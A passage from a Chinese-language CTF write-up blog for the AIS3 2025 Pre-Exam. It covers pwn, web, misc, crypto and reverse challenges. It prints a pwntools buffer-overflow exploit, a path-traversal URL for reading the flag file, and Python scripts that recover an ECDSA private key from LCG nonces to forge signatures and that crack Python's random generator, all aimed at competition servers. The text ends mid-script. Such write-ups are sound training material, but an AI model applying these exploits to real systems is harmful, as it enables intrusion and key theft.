CTFd 送不過請 base64 flag 出來用 CyberChef decode 應該就可以了</p><p><a href="http://chals1.ais3.org:60000/">Instancer</a></p><p>請先在本地測試並確定能成功攻擊後再開 instance</p><p>若同時參加兩場比賽，輸入任意一個 CTFd 的 token 皆可啟動 instance</p><p>Instancer 並非題目的一部分，請勿攻擊 Instancer。發現問題請回報 admin</p><p>Author: pwn2ooown</p></blockquote><h4 id="Writeup-3"><a href="#Writeup-3" class="headerlink" title="Writeup"></a>Writeup</h4><p>上 exploit：</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *p = remote(<span class="hljs-string">"chals1.ais3.org"</span>, <span class="hljs-number">60289</span>)p.recvuntil(<span class="hljs-string">b"?"</span>)p.sendline(<span class="hljs-string">b"yes"</span>)p.recvuntil(<span class="hljs-string">b": "</span>)p.sendline(<span class="hljs-string">b"-1"</span>)p.recvuntil(<span class="hljs-string">b": "</span>)target = <span class="hljs-number">0x401256</span>ret_addr = <span class="hljs-number">0x40101a</span>payload = <span class="hljs-string">b"A"</span> * (<span class="hljs-number">168</span>)+ p64(ret_addr) + p64(target)p.sendline(payload)p.interactive()</code></pre><p>Flag：<code>AIS3{Ave Mujica🎭將奇蹟帶入日常中🛐(Fortuna💵💵💵)...Ave Mujica🎭為你獻上慈悲憐憫✝️(Lacrima😭🥲💦)..._5a31c384269d53a52705ff3cc71db3dd}</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><h4 id="題目-4"><a href="#題目-4" class="headerlink" title="題目"></a>題目</h4><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image14.webp" alt="Screenshot 2025-06-04 at 09.15.51"></p><h4 id="Writeup-4"><a href="#Writeup-4" class="headerlink" title="Writeup"></a>Writeup</h4><p>如果直接複製會拿到另外一個 Flag，所以要直接手打。</p><p>Flag：<code>AIS3{Welcome_And_Enjoy_The_CTF_!}</code></p><h3 id="Ramen-CTF"><a href="#Ramen-CTF" class="headerlink" title="Ramen CTF"></a>Ramen CTF</h3><h4 id="題目-5"><a href="#題目-5" class="headerlink" title="題目"></a>題目</h4><blockquote><p>我在吃 CTF，喔不對，拉麵，但我忘記我在哪間店吃了．．．，請幫我找出來</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image15.webp" alt="chal"></p><p>(P.S. FlagFormat: AIS3{google map 上的店家名稱:我點的品項在菜單上的名稱})</p><p>Author: whale120</p></blockquote><h4 id="Writeup-5"><a href="#Writeup-5" class="headerlink" title="Writeup"></a>Writeup</h4><p>先確認店家名稱，透過少一碼的統編號碼 <code>3478592*</code> 到<a href="https://www.twincn.com/">台灣公司網</a>依序爆破找到統編 <code>34785923</code> 是一家「平和溫泉拉麵店」的公司。</p><p>到 Google Map 搜尋「平和溫泉拉麵店」會發現沒有查詢結果。改用該公司地址找到位於該地址的店家是「樂山溫泉拉麵」，所以應該就是他了！</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image16.webp" alt="Screenshot 2025-06-04 at 08.59.33"></p><p>接著發現圖片右邊有一張被蓋住一半的發票，用發票怪獸掃描發票 QR code 取得發票號碼為 <code>MF16879911</code>，接著使用<a href="https://www.einvoice.nat.gov.tw/portal/btc/audit/btc601w/search">電子發票整合服務平台一般性發票查詢</a>查詢發票，得到品項為「蝦拉麵」或「蔬食拉麵」。</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image17.webp" alt="Screenshot 2025-06-04 at 09.08.07"></p><p>經過和該店家的菜單比對後，嘗試提交得到正確的 Flag。</p><p>Flag：<code>AIS3{樂山溫泉拉麵:蝦拉麵}</code></p><h3 id="AIS3-Tiny-Server-Web-Misc"><a href="#AIS3-Tiny-Server-Web-Misc" class="headerlink" title="AIS3 Tiny Server - Web / Misc"></a>AIS3 Tiny Server - Web / Misc</h3><h4 id="題目-6"><a href="#題目-6" class="headerlink" title="題目"></a>題目</h4><blockquote><p>From <a href="https://github.com/7890/tiny-web-server">7890/tiny-web-server</a></p><p>I am reading <a href="http://csapp.cs.cmu.edu/">Computer Systems: A Programmer’s Perspective</a>.</p><p>It teachers me how to write a tiny web server in C.</p><p>Non-features</p><p>No security check</p><p>The flag is at /readable_flag_somerandomstring (root directory of the server). You need to find out the flag name by yourself.</p><p>The challenge binary is the same across all AIS3 Tiny Server challenges.</p><p>Note: This is a misc (or web) challenge. Do not reverse the binary. It is for local testing only. Run ./tiny -h to see the help message. You may need to install gcc-multilib to run the binary.</p><p>Note 2: Do not use scanning tools. You don’t need to scan directory.</p><p><a href="http://chals1.ais3.org:20000/">Challenge Instancer</a></p><p>Warning: Instancer is not a part of the challenge, please do not attack it.</p><p>Please solve this challenge locally first then run your solver on the remote instance.</p><p>Author: pwn2ooown</p></blockquote><h4 id="Writeup-6"><a href="#Writeup-6" class="headerlink" title="Writeup"></a>Writeup</h4><p>打開 Instance 看到路徑為 <code>/index.html</code>，看起來很可疑，將路徑回到 <code>/</code> 會看到很像 Index of 的東西</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image18.webp" alt="Screenshot 2025-06-04 at 09.59.54"></p><p>接著嘗試路徑遍歷 <code>http://chals1.ais3.org:20056/..%2f..%2f..%2f</code></p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image19.webp" alt="Screenshot 2025-06-04 at 10.01.55"></p><p>進入 Flag 路徑 <code>http://chals1.ais3.org:20056/..%2f..%2f..%2freadable_flag_qdZxvPYH5PWjkokx49O5Wki96sQjjJv2</code> 拿到 Flag。</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image20.webp" alt="Screenshot 2025-06-04 at 10.02.13"></p><p>Flag：<code>AIS3{tInY_WeB_5erV3R_wi7H_FIL3_Br0Ws1n9_a5_@_Fe@TUre}</code></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="SlowECDSA"><a href="#SlowECDSA" class="headerlink" title="SlowECDSA"></a>SlowECDSA</h3><h4 id="題目-7"><a href="#題目-7" class="headerlink" title="題目"></a>題目</h4><blockquote><p>I found this Slow version of ECDSA in my drawer, can you spot the bug?</p><p>nc chals1.ais3.org 19000</p><p>Author: whale120</p></blockquote><h4 id="Writeup-7"><a href="#Writeup-7" class="headerlink" title="Writeup"></a>Writeup</h4><p>上 POC！</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> socket<span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> NIST192p<span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_ecdsa_lcg</span>():    <span class="hljs-string">"""使用數學方法直接求解，避免暴力搜尋"""</span>    curve = NIST192p    order = curve.generator.order()        <span class="hljs-comment"># LCG 參數</span>    a = <span class="hljs-number">1103515245</span>    c = <span class="hljs-number">12345</span>        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] 連接服務器..."</span>)    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect((<span class="hljs-string">"chals1.ais3.org"</span>, <span class="hljs-number">19000</span>))        <span class="hljs-keyword">try</span>:        <span class="hljs-comment"># 接收歡迎訊息</span>        s.recv(<span class="hljs-number">4096</span>)                <span class="hljs-comment"># 獲取兩個簽名</span>        signatures = []        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):            s.send(<span class="hljs-string">b"get_example\n"</span>)            response = s.recv(<span class="hljs-number">4096</span>).decode()                        r_line = <span class="hljs-built_in">next</span>(line <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response.split(<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">'r: '</span>))            s_line = <span class="hljs-built_in">next</span>(line <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> response.split(<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">'s: '</span>))                        r = <span class="hljs-built_in">int</span>(r_line.split(<span class="hljs-string">'r: '</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)            sig_s = <span class="hljs-built_in">int</span>(s_line.split(<span class="hljs-string">'s: '</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)            signatures.append((r, sig_s))            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] 簽名 <span class="hljs-subst">{i+<span class="hljs-number">1</span>}</span>: r=<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(r)}</span>, s=<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(sig_s)}</span>"</span>)                r1, s1 = signatures[<span class="hljs-number">0</span>]        r2, s2 = signatures[<span class="hljs-number">1</span>]                <span class="hljs-comment"># 訊息雜湊</span>        h = <span class="hljs-built_in">int</span>.from_bytes(hashlib.sha1(<span class="hljs-string">b"example_msg"</span>).digest(), <span class="hljs-string">'big'</span>) % order        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] 訊息雜湊: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(h)}</span>"</span>)                <span class="hljs-comment"># 核心數學攻擊</span>        <span class="hljs-comment"># 已知：s1 = k1^(-1) * (h + r1 * d) mod n</span>        <span class="hljs-comment">#      s2 = k2^(-1) * (h + r2 * d) mod n  </span>        <span class="hljs-comment">#      k2 = a * k1 + c mod n</span>                <span class="hljs-comment"># 重新整理：k1 = (h + r1 * d) * s1^(-1) mod n</span>        <span class="hljs-comment">#          k2 = (h + r2 * d) * s2^(-1) mod n</span>                <span class="hljs-comment"># 代入 LCG 關係：</span>        <span class="hljs-comment"># (h + r2 * d) * s2^(-1) = a * (h + r1 * d) * s1^(-1) + c mod n</span>                s1_inv = <span class="hljs-built_in">pow</span>(s1, -<span class="hljs-number">1</span>, order)        s2_inv = <span class="hljs-built_in">pow</span>(s2, -<span class="hljs-number">1</span>, order)                <span class="hljs-comment"># 展開並解出 d (私鑰)：</span>        <span class="hljs-comment"># h * s2^(-1) + r2 * d * s2^(-1) = a * h * s1^(-1) + a * r1 * d * s1^(-1) + c</span>        <span class="hljs-comment"># r2 * d * s2^(-1) - a * r1 * d * s1^(-1) = a * h * s1^(-1) + c - h * s2^(-1)</span>        <span class="hljs-comment"># d * (r2 * s2^(-1) - a * r1 * s1^(-1)) = a * h * s1^(-1) + c - h * s2^(-1)</span>                coeff = (r2 * s2_inv - a * r1 * s1_inv) % order        rhs = (a * h * s1_inv + c - h * s2_inv) % order                <span class="hljs-keyword">if</span> coeff == <span class="hljs-number">0</span>:            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] 係數為 0，無法求解"</span>)            <span class="hljs-keyword">return</span>                private_key = (rhs * <span class="hljs-built_in">pow</span>(coeff, -<span class="hljs-number">1</span>, order)) % order        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] 恢復的私鑰: <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(private_key)}</span>"</span>)                <span class="hljs-comment"># 驗證並計算 k1</span>        k1 = ((h + r1 * private_key) * s1_inv) % order        k2 = ((h + r2 * private_key) * s2_inv) % order        k2_expected = (a * k1 + c) % order                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] k1 = <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(k1)}</span>"</span>)        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] k2 = <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(k2)}</span>"</span>)        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] k2 (預期) = <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(k2_expected)}</span>"</span>)                <span class="hljs-keyword">if</span> k2 != k2_expected:            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] k 值驗證失敗"</span>)            <span class="hljs-keyword">return</span>                <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] 驗證成功！開始偽造簽名..."</span>)                <span class="hljs-comment"># 預測下一個 k</span>        k3 = (a * k2 + c) % order        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] 預測的 k3 = <span class="hljs-subst">{<span class="hljs-built_in">hex</span>(k3)}</span>"</span>)                <span class="hljs-comment"># 偽造 "give_me_flag" 簽名</span>        target_msg = <span class="hljs-string">"give_me_flag"</span>        target_h = <span class="hljs-built_in">int</span>.from_bytes(hashlib.sha1(target_msg.encode()).digest(), <span class="hljs-string">'big'</span>) % order                <span class="hljs-comment"># 計算簽名</span>        R3 = k3 * curve.generator        r3 = R3.x() % order        k3_inv = <span class="hljs-built_in">pow</span>(k3, -<span class="hljs-number">1</span>, order)        s3 = (k3_inv * (target_h + r3 * private_key)) % order                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] 偽造簽名: r=<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(r3)}</span>, s=<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(s3)}</span>"</span>)                <span class="hljs-comment"># 提交簽名</span>        s.send(<span class="hljs-string">b"verify\n"</span>)        s.recv(<span class="hljs-number">1024</span>)                s.send(target_msg.encode() + <span class="hljs-string">b"\n"</span>)        s.recv(<span class="hljs-number">1024</span>)                s.send(<span class="hljs-built_in">hex</span>(r3).encode() + <span class="hljs-string">b"\n"</span>)        s.recv(<span class="hljs-number">1024</span>)                s.send(<span class="hljs-built_in">hex</span>(s3).encode() + <span class="hljs-string">b"\n"</span>)        result = s.recv(<span class="hljs-number">2048</span>).decode()                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] 攻擊結果:"</span>)        <span class="hljs-built_in">print</span>(result)                <span class="hljs-keyword">if</span> <span class="hljs-string">"flag"</span> <span class="hljs-keyword">in</span> result.lower() <span class="hljs-keyword">or</span> <span class="hljs-string">"ais3"</span> <span class="hljs-keyword">in</span> result.lower():            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] 攻擊成功！"</span>)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[-] 錯誤: <span class="hljs-subst">{e}</span>"</span>)        <span class="hljs-keyword">import</span> traceback        traceback.print_exc()    <span class="hljs-keyword">finally</span>:        s.close()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    <span class="hljs-built_in">print</span>(<span class="hljs-string">"=== 數學方法 ECDSA LCG 攻擊 ==="</span>)    solve_ecdsa_lcg()</code></pre><p>Flag：<code>AIS3{Aff1n3_nounc3s_c@N_bE_broke_ezily...}</code></p><h3 id="Stream"><a href="#Stream" class="headerlink" title="Stream"></a>Stream</h3><h4 id="題目-8"><a href="#題目-8" class="headerlink" title="題目"></a>題目</h4><blockquote><p>I love streaming randomly online!</p><p>Author : Whale120</p></blockquote><h4 id="Writeup-8"><a href="#Writeup-8" class="headerlink" title="Writeup"></a>Writeup</h4><p>POC:</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha512<span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> isqrt<span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrackrc = RandCrack()hashlist = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):    single_byte = <span class="hljs-built_in">bytes</span>([i])    hash_value = <span class="hljs-built_in">int</span>.from_bytes(sha512(single_byte).digest())    hashlist.append(hash_value)db_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">"output.txt"</span>, <span class="hljs-string">"r"</span>).readlines()db = []<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> db_file:    line = line.strip()    <span class="hljs-keyword">if</span> line:        db.append(<span class="hljs-built_in">int</span>(line, <span class="hljs-number">16</span>))rb = []mask = <span class="hljs-number">0xFFFFFFFF</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">80</span>):    hb2 = db[i]    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> hashlist:        b2 = hb2 ^ j        b = isqrt(b2)        <span class="hljs-keyword">if</span> b * b == b2:            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):                rb.append((b &gt;&gt; (k * <span class="hljs-number">32</span>)) &amp; <span class="hljs-number">0xFFFFFFFF</span>)            <span class="hljs-keyword">break</span>rb = rb[-<span class="hljs-number">624</span>:]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rb:    rc.submit(i)rand81 = rc.predict_getrandbits(<span class="hljs-number">256</span>)<span class="hljs-built_in">print</span>(<span class="hljs-string">f"The getrandbits(256) of time=81 is : <span class="hljs-subst">{rand81}</span>"</span>)<span class="hljs-keyword">def</span> <span class="hljs-title function_">int_to_str</span>(<span class="hljs-params">num</span>):    test_int = num    byte_length = (test_int.bit_length() + <span class="hljs-number">7</span>) // <span class="hljs-number">8</span>    int_to_bytes = test_int.to_bytes(byte_length, <span class="hljs-string">'big'</span>)    bytes_to_string = int_to_bytes.decode(<span class="hljs-string">'ascii'</span>, errors=<span class="hljs-string">'ignore'</span>)    <span class="hljs-keyword">return</span> bytes_to_stringorigin = <span class="hljs-number">0x1a95888d32cd61925d40815f139aeb35d39d8e33f7e477bd020b88d3ca4adee68de5a0dee2922628da3f834c9ada0fa283e693f1deb61e888423fd64d5c3694</span>flag = int_to_str(rand81**<span class="hljs-number">2</span> ^ origin)<span class="hljs-built_in">print</span>(<span class="hljs-string">f"The Flag is : <span class="hljs-subst">{flag}</span>"</span>)</code></pre><p>Flag：<code>AIS3{no_more_junks...plz}</code></p><h2 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h2><h3 id="AIS3-Tiny-Server-Reverse"><a href="#AIS3-Tiny-Server-Reverse" class="headerlink" title="AIS3 Tiny Server - Reverse"></a>AIS3 Tiny Server - Reverse</h3><h4 id="題目-9"><a href="#題目-9" class="headerlink" title="題目"></a>題目</h4><blockquote><p>Find the secret flag checker in the server binary itself and recover the flag.</p><p>The challenge binary is the same across all AIS3 Tiny Server challenges.</p><p>Please download the binary from the “AIS3 Tiny Server - Web / Misc” challenge.</p><p>This challenge doesn’t depend on the “AIS3 Tiny Server - Pwn” and can be solved independently.</p><p>It is recommended to solve this challenge locally.</p><p>Author: pwn2ooown</p></blockquote><h4 id="Writeup-9"><a href="#Writeup-9" class="headerlink" title="Writeup"></a>Writeup</h4><p>打開 IDA 查看字串，找到與 <code>flag</code> 相關的字串</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image21.webp" alt="Screenshot 2025-06-04 at 12.47.57"></p><p>查看在哪個函式中被呼叫</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image22.webp" alt="Screenshot 2025-06-04 at 12.48.05"></p><p>發現是 <code>sub_2110</code> 函式，查看該函式程式邏輯</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image23.webp" alt="Screenshot 2025-06-04 at 15.50.08 Large"></p><p>應該是透過 <code>sub_1E20</code> 函式判斷 Flag，打開來查看</p><p><img src="/posts/2025-AIS3-PreExam-MyFirstCTF-Writeup/image24.webp" alt="Screenshot 2025-06-04 at 15.42.57 Large"></p><p>寫程式逆向回去：</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {    <span class="hljs-comment">// 原始加密的整數陣列</span>    <span class="hljs-type">uint32_t</span> v8[<span class="hljs-number">11</span>] = {        <span class="hljs-number">1480073267</span>,  <span class="hljs-comment">// 0x58382033</span>        <span class="hljs-number">1197221906</span>,  <span class="hljs-comment">// 0x475C2812</span>        <span class="hljs-number">254628393</span>,   <span class="hljs-comment">// 0x0F2E5129</span>        <span class="hljs-number">920154</span>,      <span class="hljs-comment">// 0x000E0ADA</span>        <span class="hljs-number">1343445007</span>,  <span class="hljs-comment">// 0x5004D70F</span>        <span class="hljs-number">874076697</span>,   <span class="hljs-comment">// 0x34196A19</span>        <span class="hljs-number">1127428440</span>,  <span class="hljs-comment">// 0x433CB158</span>        <span class="hljs-number">1510228243</span>,  <span class="hljs-comment">// 0x59F67413</span>        <span class="hljs-number">743978009</span>,   <span class="hljs-comment">// 0x2C5A2E19</span>        <span class="hljs-number">54940467</span>,    <span class="hljs-comment">// 0x03463A33</span>        <span class="hljs-number">1246382110</span>   <span class="hljs-comment">// 0x4A4F541E</span>    };        <span class="hljs-comment">// 密鑰字符串</span>    <span class="hljs-type">char</span> key[] = <span class="hljs-string">"rikki_l0v3"</span>;        <span class="hljs-comment">// 將整數陣列轉換為字節陣列 (小端序)</span>    <span class="hljs-type">uint8_t</span> *v8_bytes = (<span class="hljs-type">uint8_t</span> *)v8;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"=== AIS3 Flag Decryption PoC ===\n\n"</span>);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"原始加密資料 (前20字節):\n"</span>);    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">20</span>; i++) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"0x%02X "</span>, v8_bytes[i]);        <span class="hljs-keyword">if</span> ((i + <span class="hljs-number">1</span>) % <span class="hljs-number">8</span> == <span class="hljs-number">0</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"使用密鑰: %s\n\n"</span>, key);        <span class="hljs-comment">// 解密過程</span>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1 = <span class="hljs-number">0</span>;    <span class="hljs-type">uint8_t</span> v2 = <span class="hljs-number">51</span>;   <span class="hljs-comment">// 初始值</span>    <span class="hljs-type">uint8_t</span> v3 = <span class="hljs-number">114</span>;  <span class="hljs-comment">// 初始值</span>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"開始解密過程...\n"</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"初始: v2=%d, v3=%d\n\n"</span>, v2, v3);        <span class="hljs-comment">// 模擬原始的解密循環</span>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {        <span class="hljs-comment">// XOR 解密</span>        v8_bytes[v1] = v2 ^ v3;                <span class="hljs-keyword">if</span> (v1 &lt; <span class="hljs-number">10</span>) {  <span class="hljs-comment">// 只顯示前10步的詳細過程</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"步驟 %2d: %3d ^ %3d = %3d ('%c')\n"</span>,                    v1 + <span class="hljs-number">1</span>, v2, v3, v8_bytes[v1],                    (v8_bytes[v1] &gt;= <span class="hljs-number">32</span> &amp;&amp; v8_bytes[v1] &lt;= <span class="hljs-number">126</span>) ? v8_bytes[v1] : <span class="hljs-string">'?'</span>);        }                v1++;        <span class="hljs-keyword">if</span> (v1 == <span class="hljs-number">45</span>) <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 解密45個字節</span>                <span class="hljs-comment">// 更新下一輪的參數</span>        v2 = v8_bytes[v1];        v3 = key[v1 % <span class="hljs-number">10</span>];    }        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"...\n"</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"解密完成！\n\n"</span>);        <span class="hljs-comment">// 顯示解密結果</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"解密後的 flag:\n"</span>);    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">45</span>; i++) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, v8_bytes[i]);    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n\n"</span>);        <span class="hljs-comment">// 驗證 flag 格式</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span>((<span class="hljs-type">char</span> *)v8_bytes, <span class="hljs-string">"AIS3{"</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"✓ Flag 格式正確 (以 AIS3{ 開頭)\n"</span>);                <span class="hljs-comment">// 尋找結尾的 }</span>        <span class="hljs-type">int</span> flag_end = <span class="hljs-number">-1</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">5</span>; i &lt; <span class="hljs-number">45</span>; i++) {            <span class="hljs-keyword">if</span> (v8_bytes[i] == <span class="hljs-string">'}'</span>) {                flag_end = i;                <span class="hljs-keyword">break</span>;            }        }                <span class="hljs-keyword">if</span> (flag_end != <span class="hljs-number">-1</span>) {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"✓ 找到結尾符號 } 在位置 %d\n"</span>, flag_end);            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"✓ Flag 長度: %d 字符\n"</span>, flag_end + <span class="hljs-number">1</span>);                        <span class="hljs-comment">// 輸出完整的 flag</span>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n=== 最終 FLAG ===\n"</span>);            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= flag_end; i++) {                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, v8_bytes[i]);            }            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n==================\n"</span>);        } <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"✗ 未找到結尾符號 }\n"</span>);        }    } <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"✗ Flag 格式不正確\n"</span>);    }        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>Flag：<code>AIS3{w0w_a_f1ag_check3r_1n_serv3r_1s_c00l!!!}</code></p><h3 id="web-flag-checker"><a href="#web-flag-checker" class="headerlink" title="web flag checker"></a>web flag checker</h3><h4 id="題目-10"><a href="#題目-10" class="headerlink" title="題目"></a>題目</h4><blockquote><p>Just a web flag checker</p><p><a href="http://chals1.ais3.org:29998/">http://chals1.ais3.org:29998</a></p><p>Author: Chumy</p></blockquote><h4 id="Writeup-10"><a href="#Writeup-10" class="headerlink" title="Writeup"></a>Writeup</h4><p>POC：</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-string">"""</span><span class="hljs-string">Simple WebAssembly Flag Extractor</span><span class="hljs-string">Quick solution for AIS3 WASM CTF Challenge</span><span class="hljs-string">"""</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">wasm_flag_extractor</span>():    <span class="hljs-string">"""Extract flag from WebAssembly challenge"""</span>        <span class="hljs-comment"># Encrypted values from WASM analysis (corrected unsigned conversion)</span>    encrypted_signed = [        <span class="hljs-number">7577352992956835434</span>,        <span class="hljs-number">7148661717033493303</span>,        -<span class="hljs-number">7081446828746089091</span>,  <span class="hljs-comment"># This was the error - need proper conversion</span>        -<span class="hljs-number">7479441386887439825</span>,  <span class="hljs-comment"># This was also wrong</span>        <span class="hljs-number">8046961146294847270</span>    ]        <span class="hljs-comment"># Convert negative values to unsigned 64-bit properly</span>    encrypted = []    <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> encrypted_signed:        <span class="hljs-keyword">if</span> val &lt; <span class="hljs-number">0</span>:            <span class="hljs-comment"># Proper two's complement conversion to unsigned 64-bit</span>            encrypted.append((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span>) + val)        <span class="hljs-keyword">else</span>:            encrypted.append(val)        <span class="hljs-comment"># Encryption parameters</span>    key = <span class="hljs-number">0xFD9EA72D</span>  <span class="hljs-comment"># -39934163 as unsigned</span>    rotations = [(key &gt;&gt; (i * <span class="hljs-number">6</span>)) &amp; <span class="hljs-number">63</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]        <span class="hljs-built_in">print</span>(<span class="hljs-string">"WASM Flag Extractor (Fixed)"</span>)    <span class="hljs-built_in">print</span>(<span class="hljs-string">"="</span> * <span class="hljs-number">40</span>)    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Key: 0x<span class="hljs-subst">{key:08X}</span>"</span>)    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Rotations: <span class="hljs-subst">{rotations}</span>"</span>)    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Encrypted values: <span class="hljs-subst">{[<span class="hljs-built_in">hex</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> encrypted]}</span>"</span>)    <span class="hljs-built_in">print</span>()        <span class="hljs-comment"># Decrypt and convert to ASCII</span>    flag = <span class="hljs-string">""</span>    <span class="hljs-keyword">for</span> i, (enc_val, rot) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>(encrypted, rotations)):        <span class="hljs-comment"># Right rotate to decrypt</span>        decrypted = ((enc_val &gt;&gt; rot) | (enc_val &lt;&lt; 